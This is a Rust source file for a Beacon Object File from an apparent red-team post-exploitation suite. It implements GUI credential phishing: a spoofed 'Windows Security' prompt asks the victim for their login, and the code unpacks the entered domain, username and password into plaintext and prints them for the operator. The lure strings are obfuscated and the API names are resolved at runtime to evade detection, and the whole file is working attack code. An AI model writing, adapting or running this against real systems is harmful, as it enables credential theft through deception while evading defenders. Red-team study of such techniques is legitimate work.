// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
//
//! GUI credential capture via OS-native CredUIPromptForWindowsCredentialsW.
//! Decrypts captured credentials with CredUnPackAuthenticationBufferW.
//! No runas spawn, no child process. All sensitive API names DFR-resolved.
//! MITRE ATT&CK: T1056.002 (Input Capture: GUI Input Capture)
#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use common::{mitre::Technique, dfr_fn, obf};

const TECHNIQUES: &[Technique] = &[
    Technique {
        id: "T1056.002",
        name: "Input Capture: GUI Input Capture",
        tactic: "Collection",
    },
];

// CREDUI flags
const CREDUIWIN_GENERIC: u32 = 0x00000001;
const CREDUIWIN_ENUMERATE_CURRENT_USER: u32 = 0x00000200;

// CredUnPackAuthenticationBuffer flags
const CRED_PACK_PROTECTED_CREDENTIALS: u32 = 0x1;

// CREDUI_INFO for the prompt dialog
#[repr(C)]
struct CredUiInfoW {
    cb_size: u32,
    hwnd_parent: usize,   // NULL — no parent window
    message_text: *const u16,
    caption_text: *const u16,
    banner_bitmap: usize, // NULL
}

dfr_fn!(
    cred_ui_prompt_for_windows_credentials_w(
        ui_info:           *const CredUiInfoW,
        auth_error:        u32,
        auth_package:      *mut u32,
        in_auth_buf:       *const u8,
        in_auth_buf_size:  u32,
        out_auth_buf:      *mut *mut u8,
        out_auth_buf_size: *mut u32,
        save:              *mut i32,
        flags:             u32
    ) -> u32,
    module = "credui.dll",
    api    = "CredUIPromptForWindowsCredentialsW"
);

dfr_fn!(
    cred_unpack_authentication_buffer_w(
        flags:        u32,
        auth_buf:     *const u8,
        auth_buf_size: u32,
        username:     *mut u16,
        username_len: *mut u32,
        domain:       *mut u16,
        domain_len:   *mut u32,
        password:     *mut u16,
        password_len: *mut u32
    ) -> i32,
    module = "credui.dll",
    api    = "CredUnPackAuthenticationBufferW"
);

dfr_fn!(
    secure_zero_memory(ptr: *mut u8, cnt: usize) -> *mut u8,
    module = "kernel32.dll",
    api    = "RtlSecureZeroMemory"
);

dfr_fn!(
    co_task_mem_free(pv: *mut u8) -> (),
    module = "ole32.dll",
    api    = "CoTaskMemFree"
);

/// Convert a null-terminated wide string slice to a fixed-width u8 buffer
/// (simple ASCII subset — sufficient for credential logging).
fn wide_to_ascii(src: &[u16]) -> [u8; 256] {
    let mut out = [0u8; 256];
    let n = src.len().min(255);
    for (i, &ch) in src[..n].iter().enumerate() {
        if ch == 0 { break; }
        out[i] = if ch < 0x80 { ch as u8 } else { b'?' };
    }
    out
}

/// Convert an ASCII byte string to a stack-allocated wide (UTF-16) buffer.
fn to_wide_128(s: &[u8]) -> [u16; 128] {
    let mut buf = [0u16; 128];
    let n = s.len().min(127);
    for (i, &b) in s[..n].iter().enumerate() {
        buf[i] = b as u16;
    }
    buf
}

#[rustbof::main]
fn main() {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    match run() {
        Ok(()) => {}
        Err(e) => eprintln!("[!] {}: operation failed ({})", env!("CARGO_PKG_NAME"), e),
    }
}

fn run() -> Result<(), &'static str> {
    // Obfuscated prompt strings — never land in .rdata as plaintext
    obf! { let title_str   = "Windows Security"; }
    obf! { let message_str = "Please enter your credentials to continue"; }

    let title_wide   = to_wide_128(title_str.as_bytes());
    let message_wide = to_wide_128(message_str.as_bytes());

    let ui_info = CredUiInfoW {
        cb_size: core::mem::size_of::<CredUiInfoW>() as u32,
        hwnd_parent: 0,
        message_text: message_wide.as_ptr(),
        caption_text: title_wide.as_ptr(),
        banner_bitmap: 0,
    };

    let mut auth_package:     u32 = 0;
    let mut out_auth_buf:    *mut u8 = core::ptr::null_mut();
    let mut out_auth_buf_size: u32 = 0;
    let mut save: i32 = 0;

    let flags = CREDUIWIN_GENERIC | CREDUIWIN_ENUMERATE_CURRENT_USER;

    let ret = unsafe {
        cred_ui_prompt_for_windows_credentials_w(
            &ui_info as *const CredUiInfoW,
            0,
            &mut auth_package as *mut u32,
            core::ptr::null(),
            0,
            &mut out_auth_buf as *mut *mut u8,
            &mut out_auth_buf_size as *mut u32,
            &mut save as *mut i32,
            flags,
        )
    }.map_err(|_| "api resolve failed")?;

    // 0 = ERROR_SUCCESS; 1223 = ERROR_CANCELLED
    if ret == 1223 {
        println!("[-] credential prompt cancelled by user");
        return Ok(());
    }
    if ret != 0 {
        return Err("prompt returned error");
    }
    if out_auth_buf.is_null() || out_auth_buf_size == 0 {
        return Err("empty auth buffer");
    }

    // Unpack the opaque auth buffer into plaintext domain/user/password
    let mut username_buf  = [0u16; 256];
    let mut domain_buf    = [0u16; 256];
    let mut password_buf  = [0u16; 256];
    let mut username_len: u32 = 256;
    let mut domain_len:   u32 = 256;
    let mut password_len: u32 = 256;

    let unpack_ok = unsafe {
        cred_unpack_authentication_buffer_w(
            CRED_PACK_PROTECTED_CREDENTIALS,
            out_auth_buf,
            out_auth_buf_size,
            username_buf.as_mut_ptr(),
            &mut username_len as *mut u32,
            domain_buf.as_mut_ptr(),
            &mut domain_len as *mut u32,
            password_buf.as_mut_ptr(),
            &mut password_len as *mut u32,
        )
    }.map_err(|_| "api resolve failed")?;

    // Securely zero and free the OS-allocated auth buffer immediately
    unsafe {
        let _ = secure_zero_memory(out_auth_buf, out_auth_buf_size as usize);
        let _ = co_task_mem_free(out_auth_buf);
    }

    if unpack_ok == 0 {
        return Err("unpack auth buffer failed");
    }

    let user_ascii = wide_to_ascii(&username_buf);
    let dom_ascii  = wide_to_ascii(&domain_buf);
    let pass_ascii = wide_to_ascii(&password_buf);

    // Locate null terminators for safe length slicing
    let user_end = user_ascii.iter().position(|&b| b == 0).unwrap_or(255);
    let dom_end  = dom_ascii.iter().position(|&b| b == 0).unwrap_or(255);
    let pass_end = pass_ascii.iter().position(|&b| b == 0).unwrap_or(255);

    println!("[+] Credentials captured:");
    // Log as raw bytes via a simple hex-free ASCII display
    // rustbof println! accepts &str — convert slices via core::str::from_utf8
    let user_str = core::str::from_utf8(&user_ascii[..user_end]).unwrap_or("?");
    let dom_str  = core::str::from_utf8(&dom_ascii[..dom_end]).unwrap_or("?");
    let pass_str = core::str::from_utf8(&pass_ascii[..pass_end]).unwrap_or("?");

    println!("  Domain   : {}", dom_str);
    println!("  Username : {}", user_str);
    println!("  Password : {}", pass_str);

    // Zero local credential copies
    for b in username_buf.iter_mut() { *b = 0; }
    for b in domain_buf.iter_mut()   { *b = 0; }
    for b in password_buf.iter_mut() { *b = 0; }

    Ok(())
}
